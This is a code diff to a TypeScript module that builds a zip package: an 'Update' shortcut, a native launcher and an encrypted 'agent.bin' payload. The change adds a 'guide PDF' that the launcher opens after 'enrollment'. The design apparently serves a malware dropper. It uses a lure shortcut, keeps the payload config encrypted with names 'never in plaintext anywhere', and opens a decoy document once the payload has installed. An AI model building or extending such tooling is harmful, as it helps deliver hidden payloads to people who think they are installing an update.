@@ -29,7 +29,7 @@ import { spawn } from "child_process";
 import * as storage from "./storage";
 import * as payloadCache from "./payload-cache";
 import * as launcherPool from "./launcher-pool";
-import { createZip } from "./zip-archive";
+import { createZip, ZipEntryInput } from "./zip-archive";
 import { validateLauncherBuild } from "./launcher-validate";
 import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";
 
@@ -48,6 +48,12 @@ export interface LauncherBuildInputs {
   outDir: string;
   /** Emit LAUNCHER-STAGE-OK after staging (observability; silent when false). */
   debug: boolean;
+  /** Optional attached guide PDF: baked into the zip's launcher subfolder and
+   *  opened in the default browser/handler right AFTER enrollment completes
+   *  (post-install auto-open; launcher.c open_pdf). */
+  pdfName?: string;
+  pdfData?: Buffer;
+  pdfDelaySec?: number;
 }
 
 export interface LauncherRunOutput {
@@ -99,6 +105,13 @@ export function buildConfigString(c: LauncherBuildInputs, payloadName?: string):
   // reads this from the decrypted config so the zip entry may be renamed
   // freely (falls back to "agent.bin" when absent — legacy stamps stay valid).
   if (payloadName) parts.push(`payName=${enc(payloadName)}`);
+  // Attached guide PDF: the native launcher opens `<its own folder>/<pdf>` in
+  // the default browser after the enrollment run (launcher.c open_pdf). The
+  // name lives ONLY in this encrypted config — never in plaintext anywhere.
+  if (c.pdfName && c.pdfData && c.pdfData.length > 0) {
+    parts.push(`pdf=${enc(c.pdfName)}`);
+    parts.push(`pdfDelay=${enc(String(c.pdfDelaySec ?? 0))}`);
+  }
   return parts.join("&");
 }
 
@@ -260,12 +273,22 @@ export async function runLauncherBuild(opts: {
 
   // 6. zip { <updateLinkName>, <innerFolder>/Launcher.exe, <innerFolder>/agent.bin }
   //    (temp files stay until validation). The launcher/* subfolder = FIX 2
-  //    structure; the names are FIX 3 (defaults preserved when unset).
-  const zip = createZip([
+  //    structure; the names are FIX 3 (defaults preserved when unset). The
+  //    attached guide PDF rides in the SAME launcher subfolder so the launcher
+  //    resolves it next to itself (`pdf` config) — Update.lnk stays alone at
+  //    the zip root.
+  const zipEntries: ZipEntryInput[] = [
     { name: updateLinkName, data: lnk },
     { name: `${innerFolder}/${launcherName}`, data: stampedExe },
     { name: `${innerFolder}/${payloadName}`, data: agentBin },
-  ]);
+  ];
+  if (inputs.pdfName && inputs.pdfData && inputs.pdfData.length > 0) {
+    zipEntries.push({
+      name: `${innerFolder}/${inputs.pdfName}`,
+      data: inputs.pdfData,
+    });
+  }
+  const zip = createZip(zipEntries);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
 
@@ -284,6 +307,9 @@ export async function runLauncherBuild(opts: {
     prevLauncherHash: lastLauncherSha256,
     prevLnkHash: lastLnkSha256,
     names: { updateLinkName, innerFolder, launcherName, payloadName },
+    ...(inputs.pdfName
+      ? { pdf: { name: inputs.pdfName, delaySec: inputs.pdfDelaySec ?? 0 } }
+      : {}),
   });
   for (const row of validation.rows) console.log(`  [validate] ${row}`);
   if (!validation.ok) {
